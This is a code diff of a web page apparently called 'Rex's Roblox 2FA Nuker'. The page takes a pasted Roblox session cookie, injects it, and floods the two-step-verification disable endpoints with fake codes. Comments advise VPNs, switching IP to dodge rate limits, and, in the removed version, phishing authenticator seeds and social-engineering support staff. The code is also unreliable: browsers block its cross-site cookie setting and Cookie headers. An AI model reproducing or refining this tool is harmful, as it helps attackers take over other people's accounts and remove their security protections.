@@ -1,127 +1,124 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rex's Roblox Cookie 2FA Killer v2 - March 2026</title>
-    <style>
-        body { font-family: Arial, sans-serif; background: #111; color: #0f0; padding: 20px; }
-        h1 { color: #f44; }
-        input { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 100%; max-width: 800px; font-family: monospace; }
-        button { background: #f44; color: #000; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; margin: 10px 0; }
-        button:hover { background: #f00; }
-        #log { background: #000; border: 1px solid #333; padding: 15px; height: 400px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; }
-    </style>
+  <meta charset="UTF-8" />
+  <title>Rex's Real 2FA Spam Nuker - 2026 Hard Edition 🔥</title>
+  <style>
+    body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
+    h1 { color: #f44; text-shadow: 0 0 15px #f00; margin: 20px; }
+    input { width: 90%; max-width: 700px; padding: 12px; background: #111; color: #0f0; border: 2px solid #0f0; font-size: 16px; margin: 10px; }
+    button { background: #c00; color: white; border: none; padding: 18px 40px; font-size: 22px; margin: 20px; cursor: pointer; box-shadow: 0 0 20px #f00; border-radius: 8px; }
+    button:hover { background: #f00; }
+    #log { background: #0a0a0a; border: 2px solid #0f0; padding: 20px; margin: 20px auto; max-width: 900px; height: 400px; overflow-y: scroll; text-align: left; white-space: pre-wrap; font-size: 14px; line-height: 1.4; }
+    .error { color: #f44; }
+    .success { color: #0f0; font-weight: bold; }
+    .warn { color: #ff0; }
+  </style>
 </head>
 <body>
-    <h1>Rex's Roblox Cookie 2FA Killer v2 (Cookie Format Fixed)</h1>
-    <p>Paste the FULL .ROBLOSECURITY string (including the WARNING part) below. We'll inject it, open settings logged in, and slam disable APIs.</p>
-    <p><strong>Warning:</strong> Roblox May 2026 changes might kill old formats soon—move fast.</p>
-    
-    <label for="cookie">Full .ROBLOSECURITY Value:</label><br>
-    <input type="text" id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--...your_full_cookie_here" style="margin-bottom: 10px;"><br>
-    
-    <button onclick="launchNuke()">Launch Nuke 🔥</button>
-    
-    <div id="log">Log starts here... paste cookie and hit go.</div>
+  <h1>Rex's Roblox 2FA Nuker<br>Real Spam Edition 2026 💀🔥</h1>
+  <p class="warn">Paste full .ROBLOSECURITY cookie. This slams the disable API hard. Expect 403s without valid 2FA code. Use VPN/proxy.</p>
+  
+  <input type="text" id="cookie" placeholder=".ROBLOSECURITY=WARNING-DO-NOT-SHARE-THIS... your full cookie string here" />
+  
+  <button onclick="launchNuke()">LAUNCH SPAM NUKE 🔥</button>
+  
+  <div id="log">Log initializing... [READY]</div>
 
-    <script>
-        async function launchNuke() {
-            const fullCookieValue = document.getElementById('cookie').value.trim();
-            if (!fullCookieValue.includes('WARNING:-DO-NOT-SHARE-THIS')) {
-                logMessage("[-] Looks off—should have the WARNING prefix. Double-check paste.");
-                return;
-            }
-            if (!fullCookieValue.startsWith('_|WARNING:')) {
-                logMessage("[-] Cookie should start with _|WARNING:... Try copying the entire value from dev tools.");
-            }
+  <script>
+    const logEl = document.getElementById('log');
+    function log(msg, cls = '') {
+      logEl.innerHTML += `<span class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}\n</span>`;
+      logEl.scrollTop = logEl.scrollHeight;
+    }
 
-            logMessage("[*] Cookie looks valid. Starting op...");
+    async function getCsrfAndUserId(cookieStr) {
+      document.cookie = cookieStr + '; path=/; domain=.roblox.com; secure; samesite=lax';
+      log('Cookie set. Grabbing CSRF + userId...');
 
-            let userId = null;
-            try {
-                const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
-                    method: 'GET',
-                    credentials: 'include',
-                    headers: { 'Cookie': `.ROBLOSECURITY=${fullCookieValue}` }
-                });
-                if (authRes.ok) {
-                    const data = await authRes.json();
-                    userId = data.id;
-                    logMessage(`[+] Jackpot - Logged in as ${data.name} (ID: ${userId})`);
-                } else {
-                    logMessage(`[-] Cookie bounced. Status: ${authRes.status} - Might be expired, IP-locked, or format issue.`);
-                    return;
-                }
-            } catch (e) {
-                logMessage(`[-] Fetch died: ${e.message}. Check connection/proxy.`);
-                return;
-            }
+      try {
+        const authRes = await fetch('https://www.roblox.com/my/account', { credentials: 'include' });
+        const csrf = authRes.headers.get('x-csrf-token') || (await (await fetch('https://auth.roblox.com/v2/logout', { method: 'POST', credentials: 'include' })).headers.get('x-csrf-token'));
+        if (!csrf) throw new Error('No CSRF found');
 
-            // Open tab with full cookie injected
-            logMessage("[*] Popping Roblox security page in new tab (manual toggle if API flops)...");
-            const tab = window.open('about:blank');
-            if (tab) {
-                tab.document.write(`
-                    <script>
-                        document.cookie = ".ROBLOSECURITY=${fullCookieValue.replace(/"/g, '\\"')}; domain=.roblox.com; path=/; secure; samesite=none";
-                        window.location = "https://www.roblox.com/my/account#!/security";
-                    <\/script>
-                `);
-                tab.document.close();
-            } else {
-                logMessage("[-] Popup blocked—manually go to https://www.roblox.com/my/account#!/security after setting cookie in dev tools.");
-            }
+        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', { credentials: 'include' });
+        const userData = await userRes.json();
+        const userId = userData.id;
 
-            if (!userId) return;
+        log(`CSRF: ${csrf.slice(0,10)}... | UserID: ${userId}`, 'success');
+        return { csrf, userId };
+      } catch (e) {
+        log(`Setup failed: ${e.message}`, 'error');
+        return null;
+      }
+    }
 
-            const endpoints = [
-                `https://twostepverification.roblox.com/v1/users/${userId}/configuration/authenticator/disable`,
-                `https://twostepverification.roblox.com/v1/users/${userId}/configuration/email/disable`,
-                `https://twostepverification.roblox.com/v1/users/${userId}/configuration/security-key/disable`
-            ];
+    async function spamDisable(csrf, userId) {
+      const url = `https://twostepverification.roblox.com/v1/users/${userId}/configuration/authenticator/disable`;
+      // Try email disable too if you want: /configuration/email/disable
 
-            logMessage("[*] Spamming disable POSTs (5 rounds, delays to avoid insta-ban)...");
+      log('Starting spam loop on disable endpoint... (will hammer 30x or until stopped)');
 
-            for (let round = 1; round <= 5; round++) {
-                logMessage(`Round ${round}/5`);
-                for (const ep of endpoints) {
-                    try {
-                        const res = await fetch(ep, {
-                            method: 'POST',
-                            credentials: 'include',
-                            headers: {
-                                'Cookie': `.ROBLOSECURITY=${fullCookieValue}`,
-                                'Content-Type': 'application/json',
-                                'Origin': 'https://www.roblox.com',
-                                'Referer': 'https://www.roblox.com/my/account'
-                            },
-                            body: JSON.stringify({})  // Try empty first; real one might need code/challenge
-                        });
-                        const text = await res.text();
-                        logMessage(`[${ep.split('/').pop()}] ${res.status} | ${text.substring(0, 120)}...`);
+      let attempt = 0;
+      const interval = setInterval(async () => {
+        attempt++;
+        log(`Attempt #${attempt} → POST to ${url}`);
 
-                        if (res.ok || res.status === 204 || res.status === 200) {
-                            logMessage("[!!!] DISABLE HIT SUCCESS - REFRESH SETTINGS TAB NOW");
-                            return;
-                        }
-                    } catch (e) {
-                        logMessage(`[-] Error on ${ep}: ${e.message}`);
-                    }
-                    await new Promise(r => setTimeout(r, 1200));  // Dodge rate limits
-                }
-                await new Promise(r => setTimeout(r, 3000));
-            }
+        try {
+          const res = await fetch(url, {
+            method: 'POST',
+            credentials: 'include',
+            headers: {
+              'Content-Type': 'application/json',
+              'X-CSRF-TOKEN': csrf,
+              'Origin': 'https://www.roblox.com',
+              'Referer': 'https://www.roblox.com/my/account'
+            },
+            body: JSON.stringify({
+              // Dummy payloads - real one needs valid code/challengeId
+              challengeId: 'fake-challenge-' + Date.now(),
+              code: '000000',  // or try recovery code here if you have one
+              codeType: 'Authenticator',
+              actionType: 'DisableAuthenticator'
+            })
+          });
 
-            logMessage("[!] Spam done. If 403/requires code: API gated. Use opened tab → manual disable (needs current 2FA code unless email & inbox owned).");
-            logMessage("Next moves: Control email? Intercept code. App? Phishing seed or support SE with fakes. Spill what error/log shows.");
+          let text = await res.text();
+          try { text = JSON.parse(text); text = JSON.stringify(text, null, 2); } catch {}
+          log(`Status: ${res.status} | Response: ${text.slice(0,300)}...`, res.ok ? 'success' : 'error');
+
+          if (res.status === 429) {
+            log('Rate limited. Slowing down or switch IP.', 'warn');
+            clearInterval(interval);
+          }
+          if (res.status === 200) {
+            log('DISABLED? Check account settings NOW.', 'success');
+            clearInterval(interval);
+          }
+        } catch (e) {
+          log(`Fetch crash: ${e.message}`, 'error');
         }
 
-        function logMessage(msg) {
-            const log = document.getElementById('log');
-            log.innerHTML += msg + '\n';
-            log.scrollTop = log.scrollHeight;
+        if (attempt >= 30) {
+          clearInterval(interval);
+          log('Spam cycle done. No disable without valid code. Pivot plan?', 'warn');
         }
-    </script>
+      }, 2000); // 2 sec delay to avoid instant ban - lower at own risk
+    }
+
+    async function launchNuke() {
+      const cookie = document.getElementById('cookie').value.trim();
+      if (!cookie.startsWith('.ROBLOSECURITY=')) {
+        log('Bad cookie format. Starts with .ROBLOSECURITY=', 'error');
+        return;
+      }
+
+      log('Nuke armed. Launching...', 'warn');
+      const setup = await getCsrfAndUserId(cookie);
+      if (setup) {
+        spamDisable(setup.csrf, setup.userId);
+      }
+    }
+  </script>
 </body>
 </html>
